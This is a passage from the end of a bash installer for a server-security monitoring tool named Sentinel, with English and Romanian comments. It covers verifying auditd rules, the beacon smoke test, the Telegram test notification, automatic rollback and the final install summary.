        [[ -n "$sig" ]] && have_sig["$sig"]="$n"
    done < <(auditctl -l 2>/dev/null | audit_rule_signatures | sort | uniq -c || true)

    local total=0 present=0 got_n missing=() unchecked=()
    for sig in "${!want_sig[@]}"; do
        case "$sig" in
            "option "*)    continue ;;   # not listed by auditctl -l; checked below
            "unchecked "*) unchecked+=("${sig#unchecked }"); continue ;;
        esac
        total=$(( total + want_sig["$sig"] ))
        got_n="${have_sig[$sig]:-0}"
        if (( got_n >= want_sig["$sig"] )); then
            present=$(( present + want_sig["$sig"] ))
        else
            present=$(( present + got_n ))
            missing+=("${sig}: ${got_n} of ${want_sig[$sig]} in the kernel")
        fi
    done

    # -b and --backlog_wait_time never appear in `auditctl -l` — they are
    # settings, and `auditctl -s` is where the kernel says what it accepted.
    # Passing over them silently would leave the one number that decides whether
    # records are DROPPED unverified, and a dropped record looks exactly like a
    # command that was never run.
    local status kernel_key kernel_val optname optval
    status="$(auditctl -s 2>/dev/null || true)"
    for sig in "${!want_sig[@]}"; do
        [[ "$sig" == "option "* ]] || continue
        read -r _ optname optval <<< "$sig"
        case "$optname" in
            -b)                  kernel_key=backlog_limit ;;
            --backlog_wait_time) kernel_key=backlog_wait_time ;;
            *)                   unchecked+=("$sig"); continue ;;
        esac
        kernel_val="$(awk -v k="$kernel_key" '$1 == k { print $2; exit }' <<< "$status")"
        [[ "$kernel_val" == "$optval" ]] || \
            missing+=("${kernel_key} is ${kernel_val:-unreadable} in the kernel, not ${optval}")
    done

    # `auditctl -l` reads the KERNEL, and kernel rules outlive the daemon that
    # asked for them. "confirmed loaded" was printed on a host where auditd was
    # dead: the rules were in place, nothing was writing them to audit.log, and
    # every host.* detection was reading an empty file.
    local audit_pid audit_enabled dead=()
    audit_pid="$(awk '$1 == "pid" { print $2; exit }' <<< "$status")"
    audit_enabled="$(awk '$1 == "enabled" { print $2; exit }' <<< "$status")"
    [[ "$audit_enabled" == "1" || "$audit_enabled" == "2" ]] || \
        dead+=("kernel auditing is '${audit_enabled:-unreadable}', not enabled")
    [[ "$audit_pid" =~ ^[1-9][0-9]*$ ]] || \
        dead+=("no auditd daemon is running (pid '${audit_pid:-unreadable}'), so nothing \
reaches ${AUDITD_LOG_PATH} however many rules the kernel holds")

    # ONE verdict. The old block printed "augenrules failed" and then
    # "rules installed and confirmed loaded" two lines apart, and an operator
    # reading two opposite statements believes the second one.
    local problems=("${missing[@]}" "${dead[@]}")
    for line in ${dropped_other[@]+"${dropped_other[@]}"}; do
        problems+=("NOT installed, its directory does not exist here: ${line}")
    done
    [[ -n "$errs" ]] && problems+=("augenrules did not load the whole file:
${errs}")
    (( ${#unchecked[@]} )) && problems+=("these lines could not be verified at all: ${unchecked[*]}")

    if (( ${#problems[@]} )); then
        warn "auditd: ${present}/${total} of Sentinel's rules are in the kernel, and:
    $(printf '%s\n    ' "${problems[@]}")
    Inspect with: auditctl -l ; auditctl -s ; augenrules --load"
    else
        ok "auditd: all ${total} rules from sentinel.rules counted one by one in the \
kernel, and auditd (pid ${audit_pid}) is collecting"
    fi
}

step_auxiliary() {
    install_audit_rules
    if [[ -f "${SCRIPT_DIR}/fail2ban/sentinel-web.conf" ]] && have fail2ban-client; then
        install -D -m 0644 "${SCRIPT_DIR}/fail2ban/sentinel-web.conf" \
            /etc/fail2ban/jail.d/sentinel-web.conf
        systemctl reload fail2ban 2>/dev/null || true
        ok "fail2ban jail installed for the dashboard login"
    fi

    # The ingest daemon (P3) runs as the unprivileged `sentinel` user and needs to
    # read the nginx access logs, which ship 640 nginx:root — unreadable to it. A
    # per-user ACL grants exactly read, and a default ACL on the directory keeps
    # it working across logrotate (the new file inherits the default). This is
    # least-privilege: read on the logs, nothing else. It runs only if nginx and
    # setfacl are present.
    if [[ -d /var/log/nginx ]]; then
        if ! have setfacl; then
            pkg_install acl >/dev/null 2>&1 || warn "acl (setfacl) unavailable; ingest may not read nginx logs"
        fi
        if have setfacl; then
            setfacl -m u:"${SENTINEL_USER}":rx /var/log/nginx 2>/dev/null || true
            setfacl -d -m u:"${SENTINEL_USER}":rx /var/log/nginx 2>/dev/null || true
            setfacl -R -m u:"${SENTINEL_USER}":r /var/log/nginx/*.log 2>/dev/null || true
            ok "granted ${SENTINEL_USER} read access to the nginx logs (ACL)"
        fi
    fi
}

# --- 37 -------------------------------------------------------------------
# Beaconul BATE? — nu „e activ", ci contorul lui a avansat.
#
# `sentinel-beacon.service` poate fi `active` și complet mut: fără identitate de
# instalare expeditorul nu trimite nimic, iar procesul rămâne în picioare la
# aceeași cadență, dinadins (sentinel/report/beacon.py). Deci `is-active` e
# exact tiparul din CLAUDE.md — cod de ieșire în loc de efect — cu o singură
# diferență: aici efectul e vizibil.
#
# `beacon:seq` din `collector_cursors` se incrementează chiar înainte de POST,
# deci avansează și când martorul e căzut sau refuză semnalul. Asta e proprietatea
# potrivită: verificăm că EXPEDITORUL produce semnale, nu că martorul le acceptă
# — al doilea depinde de o cheie pusă manual în alt panou și n-are ce căuta
# într-o poartă de instalare.
smoke_beacon_is_beating() {
    local waited=0 limit before after

    if ! systemctl is-active --quiet sentinel-beacon.service; then
        # Ce s-a OBSERVAT, nu de ce. Cauza obișnuită e că martorul extern nu e
        # configurat, dar starea asta se atinge și cu el configurat perfect: o
        # identitate coruptă face `ensure_instance_id` să refuze rescrierea și
        # `start_beacon_unit` să refuze repornirea, iar unitatea rămâne activată
        # și nepornită. O propoziție liniștitoare despre o cauză pe care
        # verificarea nu s-a uitat la ea e chiar tiparul din CLAUDE.md.
        info "sentinel-beacon nu rulează — nimic de probat"
        return 0
    fi

    # Fereastra se derivă din cadență, nu e o constantă. `beacon.interval_s` nu
    # are limită superioară în `_validate`, deci un interval de 120 s ar face
    # verificarea asta să se plângă la FIECARE instalare despre un beacon perfect
    # sănătos — iar un avertisment care apare mereu e unul pe care nimeni nu-l
    # mai citește. Martorul își scalează la fel răbdarea (`allowance` din
    # aggregator/lib/verify.ts), doar cu alt factor.
    limit="$(( 2 * $(beacon_interval_s) ))"
    (( limit < 90 )) && limit=90

    before="$(beacon_seq)"
    while (( waited < limit )); do
        sleep 5; waited=$((waited + 5))
        after="$(beacon_seq)"
        # `-n` nu e prisos: `beacon_seq` întoarce ȘIR GOL și când interogarea
        # eșuează — postgres repornit, limită de conexiuni atinsă, socket căzut —
        # fiindcă stderr-ul ei merge la /dev/null. Fără el, primul eșec de sondă
        # ar fi „diferit de valoarea dinainte", iar instalarea ar tipări o linie
        # verde de succes cu dovada goală în ea: „beacon:seq 7098 → , în 5s".
        # Adică exact minciuna pe care funcția asta există ca s-o oprească, un
        # strat mai jos.
        if [[ -n "$after" && "$after" != "$before" ]]; then
            ok "beaconul bate (beacon:seq ${before:-–} → ${after}, în ${waited}s)"
            return 0
        fi
    done

    warn "sentinel-beacon e ACTIV dar nu a trimis niciun semnal în ${waited}s"
    warn "(beacon:seq a rămas la '${before:-inexistent}'). Un proces viu care nu"
    warn "trimite e tăcere pentru martorul extern, iar el o va raporta ca alarmă"
    warn "critică. Cauza cea mai probabilă e identitatea instalării:"
    warn "    journalctl -u sentinel-beacon -n 30"
    warn "    ls -l ${SENTINEL_CONFIG_DIR}/instance_id"
}

# Cadența beaconului din configurație, sau 60 dacă nu se poate afla.
#
# Valoarea implicită e cea din `BeaconConfig`, nu una inventată aici, iar o
# configurație pe care n-o putem citi duce la fereastra dinainte — nu la una
# infinită. „Nu știu" nu are voie să însemne „așteaptă oricât".
#
# `tr -dc '0-9'` a fost înlocuit fiindcă ștergea punctul în loc să-l înțeleagă:
# `60.0` ieșea `600` (fereastră de 20 de minute în loc de 2), iar `0.5` ieșea
# `05`. Cât timp `_coerce` din sentinel/config.py lăsa floatul neatins, un
# `interval_s: 60.0` era vizibil greșit peste tot; de când îl normalizează la
# `60`, funcția asta a rămas SINGURUL cititor care mai înțelege altceva decât
# agentul — adică o valoare pe care instalatorul și serviciul o citesc diferit,
# fără ca ceva să spună asta.
#
# Ce nu se ghicește se refuză, și atunci se folosește valoarea implicită: `0.5`
# nu are conversie onestă la un întreg (`_coerce` îl respinge cu ConfigError), și
# nici `abc`. „Nu știu" înseamnă fereastra implicită, nu o cifră inventată din
# caractere rămase.
beacon_interval_s() {
    local raw value default=60
    # `|| true` nu e prisos: `awk` iese cu 2 pe un fișier care nu există, iar
    # `set -e` oprește instalarea pe o atribuire cu substituție de comandă care
    # eșuează. O configurație pe care n-o putem citi trebuie să ducă la fereastra
    # implicită, nu la o instalare moartă în funcția care calculează un timeout.
    raw="$(awk '
        /^[^[:space:]#]/ { inb = ($0 ~ /^beacon:/) }
        inb && $1 == "interval_s:" { print $2; exit }
    ' "${SENTINEL_CONFIG_DIR}/sentinel.yaml" 2>/dev/null || true)"

    if [[ -z "$raw" ]]; then
        # Cheia lipsește, secțiunea lipsește, sau fișierul lipsește. Valoarea
        # implicită E răspunsul aici — la fel ca în `BeaconConfig` — deci nu se
        # avertizează. Un avertisment la fiecare instalare care nu setează câmpul
        # e chiar felul în care operatorul învață să treacă peste avertismente.
        printf '%s' "$default"
        return 0
    fi

    # Ghilimelele NU se scot, dinadins. `_coerce` din sentinel/config.py nu
    # convertește un `str` la `int`, deci `interval_s: "90"` ajunge la
    # `asyncio.sleep('90')` și omoară beaconul la prima rundă. Un instalator care
    # ar citi 90 de acolo ar raporta o fereastră pentru un serviciu care nu
    # pornește; refuzul de mai jos descrie situația, tolerarea ar ascunde-o.
    value="$raw"

    if [[ "$value" =~ ^[1-9][0-9]*$ ]]; then
        : # zecimal, forma obișnuită
    elif [[ "$value" =~ ^0[0-7]+$ ]]; then
        # YAML 1.1 citește un zero în față ca OCTAL, iar PyYAML face exact asta:
        # `060` ajunge 48 în `cfg.beacon.interval_s`, deci beaconul doarme 48 de
        # secunde. Fereastra de aici trebuie să fie a lui 48, nu a lui 60 —
        # altfel instalatorul și agentul citesc din nou numere diferite din
        # același rând, care e chiar lucrul reparat aici.
        value="$(( 8#${value#0} ))"
    elif [[ "$value" =~ ^([1-9][0-9]*)\.0+$ ]]; then
        # Exact ce face `_coerce`: un float întreg devine întregul lui.
        value="${BASH_REMATCH[1]}"
    else
        value=""
    fi

    if [[ -z "$value" || "$value" -le 0 ]]; then
        # `08` e cazul care a cerut ramura asta. Nu e nici zecimal (zero în
        # față), nici octal (cifra 8), deci PyYAML îl lasă ȘIR — agentul e
        # oricum stricat cu el, doar altfel. Ce nu e acceptabil e felul în care
        # se afla: `08` trecea de o verificare „numai cifre", ajungea în
        # `$(( 2 * 08 ))`, iar sub `set -euo pipefail` instalarea murea cu
        # „value too great for base (error token is "08")" și apoi cu
        # „limit: unbound variable". Operatorul primea un mesaj despre bash în
        # locul numelui câmpului, după o schimbare întreagă făcută ca să
        # primească numele câmpului.
        warn "beacon.interval_s din ${SENTINEL_CONFIG_DIR}/sentinel.yaml nu e un" \
             "număr întreg pozitiv de secunde (am citit: ${raw})."
        warn "Folosesc ${default}s pentru fereastra probei de fum, dar verifică rândul" \
             "acela: agentul nu obține nici el un număr din el, deci beaconul poate" \
             "să nu pornească deloc."
        value="$default"
    fi
    printf '%s' "$value"
}

beacon_seq() {
    sudo -u postgres psql -d sentinel -tAc \
        "SELECT cursor FROM collector_cursors WHERE name = 'beacon:seq'" 2>/dev/null \
        | tr -d '[:space:]'
}

step_smoke_test() {
    "${SENTINEL_PREFIX}/bin/sentinel" config-check -v || warn "config-check reported problems"

    smoke_beacon_is_beating

    # Loopback first: proves the app and nginx agree, independently of DNS, the
    # certificate and the provider firewall. Separating the two checks means a
    # failure says *which* of those is wrong.
    if curl -sk --max-time 10 -o /dev/null -w '%{http_code}' \
        "https://127.0.0.1:${PUBLIC_PORT}/healthz" | grep -qE '^(200|401|302|503)$'; then
        ok "nginx is serving the dashboard on :${PUBLIC_PORT}"
    else
        warn "nothing answered on https://127.0.0.1:${PUBLIC_PORT}/healthz"
    fi

    if [[ -n "$DOMAIN" ]]; then
        if curl -sk --max-time 10 -o /dev/null -w '%{http_code}' \
            "https://${DOMAIN}:${PUBLIC_PORT}/healthz" | grep -qE '^(200|401|302)$'; then
            ok "dashboard reachable at https://${DOMAIN}:${PUBLIC_PORT}"
        else
            warn "https://${DOMAIN}:${PUBLIC_PORT}/healthz did not answer. If the \
loopback check above passed, then either the provider firewall is blocking \
:${PUBLIC_PORT} or DNS is not pointing here yet — Sentinel itself is fine."
        fi
    fi
}

# --- 38 -------------------------------------------------------------------
step_verify_nothing_broken() {
    # The check that matters most. Sentinel installing perfectly while stopping
    # something the server was already doing is a failed deployment, not a
    # partial success — and the operator would find out from their users.
    if ! assert_nothing_broken "after install"; then
        warn "rolling back automatically"
        "${SCRIPT_DIR}/rollback.sh" "$SNAPSHOT_DIR" --yes || true
        die "the deployment stopped a service that was running before it started. \
Rolled back. Compare ${STATE_MARKERS}/baseline-services.txt with the current state."
    fi
}

# --- 39 -------------------------------------------------------------------
# How long the test send may take before the installer stops waiting for it.
#
# The command bounds itself already: one request per allowed chat, ten seconds
# each. This is the outer bound, and it exists for the case the inner one does
# not cover — a command that does something other than what this step believes
# it does. That is not hypothetical: this step used to invoke a flag NOTHING
# defined, the CLI dropped unknown flags, and the line therefore started a
# second Telegram long-poller against the token the live unit was already
# using. It never returned, so neither branch below ever printed, and every
# deploy was killed by hand at step 39 — which skipped deploy.sh's cleanup of
# /tmp/sentinel-deploy-*, and that is how three copies of credentiale.txt sat
# world-readable on the host for nine days (docs/INTARIRE.md §0).
NOTIFY_TIMEOUT_S=60

step_notify() {
    # Receiving this message IS the end-to-end proof: config loaded, secrets
    # readable, network egress works, the bot token is valid, the chat id is
    # right. A green install log proves much less.
    #
    # So the verdict here is Telegram's answer, not this script's exit code:
    # `sentinel telegram --send-test` returns 0 only when the API handed back a
    # message_id for every allowed chat, 78 when telegram is not configured at
    # all, and non-zero with the reason printed when a send was tried and did
    # not land.
    #
    # Every substitution has a fallback, and that is not defensive habit: this
    # runs under `set -e`, where a bare `msg="$(hostname -f)"` aborts the
    # function the moment `hostname -f` fails — and it does fail, on exactly the
    # fresh VPS this installer targets, when no FQDN resolves yet. The step
    # would then print no verdict at all, which is the failure being repaired.
    local rc=0 msg version host
    version="$(cat "${SENTINEL_PREFIX}/VERSION" 2>/dev/null || echo unknown)"
    host="$(hostname -f 2>/dev/null || hostname 2>/dev/null || echo unknown)"
    msg="Sentinel ${version} instalat pe ${host}. Dashboard: https://${DOMAIN:-<fara domeniu>}"

    if ! have timeout; then
        # Refused rather than run unguarded. An installer that can hang forever
        # on its last step is the defect this step is being repaired for, and
        # "probably fine" is not a reason to reintroduce it.
        warn "coreutils' timeout(1) is missing, so this step cannot be bounded. \
Skipping the test send — the alert channel is UNPROVEN. Run it by hand: \
${SENTINEL_PREFIX}/bin/sentinel telegram --send-test"
        return 0
    fi

    # stderr is deliberately NOT discarded: when a send fails, Telegram's own
    # words ("chat not found", "Unauthorized") are the entire diagnostic, and
    # the previous version of this line sent them to /dev/null.
    timeout --kill-after=10s "${NOTIFY_TIMEOUT_S}s" \
        "${SENTINEL_PREFIX}/bin/sentinel" telegram --send-test --message "$msg" || rc=$?

    case "$rc" in
        0)
            ok "Telegram accepted the test message for every allowed chat — \
check that it arrived on your phone"
            ;;
        78)
            info "Telegram is not configured, so nothing was sent. Everything \
else is installed; alerts will go to the dashboard only."
            ;;
        124|137)
            # 124 = timeout sent TERM, 137 = it had to follow up with KILL.
            #
            # A warning, not a die. The host is fully installed by this point,
            # and stopping the run here would report the wrong thing to the
            # operator AND to scripts/deploy.sh, which reads a failed install as
            # "nothing works" and leaves its /tmp tree in place. What is true is
            # narrower and is said as such: the alert channel is unproven.
            warn "the Telegram test did not return within ${NOTIFY_TIMEOUT_S}s and was \
killed. Sentinel is installed; the alert channel is UNPROVEN. Check it by hand: \
${SENTINEL_PREFIX}/bin/sentinel telegram --send-test"
            ;;
        *)
            warn "the Telegram test failed (exit ${rc}) — the reason is printed \
above, from Telegram. Sentinel is installed, but it cannot reach you yet."
            ;;
    esac
}

# ===========================================================================
main() {
    section "Sentinel installer"
    log "  version : $(cat "${SRC_ROOT}/VERSION" 2>/dev/null || echo unknown)"
    log "  host    : $(hostname -f 2>/dev/null || hostname)"
    log "  domain  : ${DOMAIN:-<none>}"
    log "  snapshot: ${SNAPSHOT_DIR}"

    lockout_warning
    confirm "Continui cu instalarea?" || die "aborted by the operator"

    run_step  1 preflight         step_preflight

    # Unconditional, every run — NOT a step. It sets in-process state (PUBLIC_PORT,
    # ADMIN_IP, SURICATA_OK, nginx mode) that later steps read, and that state does
    # not survive as a marker. Gating it is what broke shared-mode resumes.
    resolve_config

    run_step 18 snapshot          step_snapshot
    run_step 19 user_and_dirs     step_user_and_dirs

    # Necondiționat, la fiecare rulare — NU un pas, exact ca `resolve_config` și
    # `ensure_instance_id`. Motivele, pe larg, la definiția funcției: pasul 26
    # (ALWAYS) scrie `scan.containers` din măsurătoarea asta, iar docker poate
    # apărea pe gazdă oricând după ziua instalării, când pasul 19 e demult marcat.
    #
    # Aici, și nu mai jos: systemd rezolvă grupurile suplimentare la PORNIREA
    # unității. Pasul 32 repornește unitățile, deci o apartenență acordată după el
    # n-ar ajunge la niciun proces până la deploy-ul următor.
    ensure_docker_access

    run_step 20 packages          step_packages
    run_step 21 external_tools    step_external_tools
    run_step 22 postgres          step_postgres
    run_step 23 venv              step_venv
    run_step 24 package           step_package
    run_step 25 claude_workspace  step_claude_workspace
    run_step 26 configs           step_configs
    run_step 27 secrets           step_secrets

    # Necondiționat, la fiecare rulare — NU un pas, exact ca `resolve_config`.
    #
    # A stat până acum ÎN pasul 27, iar asta a fost o greșeală cu consecință
    # măsurată pe gazda de producție: pasul 27 e marcat ca făcut din ziua
    # instalării și NU e în ALWAYS_STEPS, deci pe orice gazdă instalată înainte
    # ca identitatea să existe, apelul nu se atingea niciodată. Comanda de
    # actualizare din docs/DEPLOYMENT.md §7 nu trece `--force-step 27` și nimic
    # nu o obliga; în schimb `step_start_services` (ALWAYS) repornea beaconul
    # oricum. Rezultat: cod nou, fișier inexistent, beacon repornit direct în
    # tăcere, iar martorul suna o alarmă critică despre un server sănătos.
    # Documentația nu putea repara asta — o gazdă nu citește documentație.
    #
    # De ce nu un pas nou: un număr nou ar muta numerele tuturor pașilor de după
    # el, adică ar invalida fiecare `--force-step N` din documentație, din
    # DEPANARE.md și din istoricul comenzilor operatorului.
    #
    # De ce nu `secrets` în ALWAYS_STEPS: pasul ăla citește stdin și rescrie
    # /etc/sentinel/secrets.env de la zero. Rularea lui la fiecare deploy e
    # exact operația pentru care există toată mașinăria de păstrare a cheilor,
    # și n-are nicio legătură cu identitatea.
    #
    # Sigur de rulat oricând: `ensure_instance_id` e idempotentă și refuză
    # explicit să regenereze o identitate existentă — vezi corpul ei. Asta e
    # chiar proprietatea pentru care a fost scrisă așa.
    ensure_instance_id

    run_step 28 migrate           step_migrate
    run_step 29 nftables          step_nftables
    run_step 30 systemd           step_systemd
    run_step 31 discovery         step_discovery
    run_step 32 start_services    step_start_services
    if [[ "$NGINX_MODE" == "shared" ]]; then
        run_step 33 nginx_shared  step_nginx_shared
    else
        run_step 33 nginx         step_nginx
    fi
    run_step 34 admin_user        step_admin_user
    run_step 35 suricata          step_suricata
    run_step 36 deploy_account    step_deploy_account
    run_step 37 auxiliary         step_auxiliary
    run_step 38 smoke_test        step_smoke_test
    run_step 39 verify_intact     step_verify_nothing_broken
    run_step 40 notify            step_notify

    # Before the success banner, not after it: what the run declined to do, and
    # whether what it was told to force actually ran. `assert_forced_steps_ran`
    # can end the run here, which is the point — "installation finished" printed
    # over an unperformed request is what sent an operator away believing a
    # password had been rotated when it had not.
    report_marked_skips
    assert_forced_steps_ran

    section "Instalare completă"
    cat <<EOF

  Dashboard   : https://${DOMAIN:-$(hostname -f)}$( [[ "$NGINX_MODE" == "shared" ]] || printf ':%s' "$PUBLIC_PORT" )
  Mod nginx   : ${NGINX_MODE}
  Config      : ${SENTINEL_CONFIG_DIR}/sentinel.yaml
  Inventar    : ${SENTINEL_CONFIG_DIR}/inventory.yaml   <- REVIZUIEȘTE
  Loguri      : journalctl -fu 'sentinel-*'
  Snapshot    : ${SNAPSHOT_DIR}
  Rollback    : ${SCRIPT_DIR}/rollback.sh ${SNAPSHOT_DIR}

  AUTO-BLOCK ESTE DEZACTIVAT. Primele 72h sunt în mod „observă": primești pe
  Telegram ce AR FI fost blocat, cu buton. După ce verifici că nu apar
  fals-pozitive (monitoare uptime, Let's Encrypt, crawlere, IP-ul tău mobil),
  activează-l:

      sed -i 's/enabled: false/enabled: true/' ${SENTINEL_CONFIG_DIR}/sentinel.yaml
      systemctl restart sentinel-detect

  PORTUL ${PUBLIC_PORT} TREBUIE DESCHIS în firewall-ul providerului. nftables pe
  această gazdă este deny-lister cu 'policy accept' și nu îl blochează, dar un
  security group din cloud o face. Verifică din exterior:

      curl -sk -o /dev/null -w '%{http_code}
' https://${DOMAIN:-<host>}:${PUBLIC_PORT}/healthz

  Ieșiri de urgență:
      touch ${SENTINEL_CONFIG_DIR}/PANIC     -> blocklist golit în ≤60s
      reboot                                 -> blocurile nu se persistă

EOF
    (( WARN_COUNT > 0 )) && warn "${WARN_COUNT} avertisment(e) — vezi mai sus"
    return 0
}

main "$@"
